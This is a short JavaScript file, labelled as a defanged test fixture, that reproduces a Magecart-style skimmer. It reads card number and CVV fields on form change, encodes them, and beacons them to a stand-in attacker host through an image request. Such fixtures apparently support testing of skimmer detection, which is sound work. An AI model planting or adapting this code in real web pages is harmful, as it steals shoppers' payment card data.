// DEFANGED TEST FIXTURE: classic Magecart card-field skimmer.
document.addEventListener("change", function(){
  var num = document.querySelector('input[name="cardnumber"]');
  var cvv = document.querySelector('input[autocomplete="cc-csc"]');
  if (num && cvv && num.value.length > 12) {
    var data = btoa(num.value + "|" + cvv.value);
    new Image().src = "https://cdn-analytics.attacker.invalid/p.gif?d=" + data;
  }
});
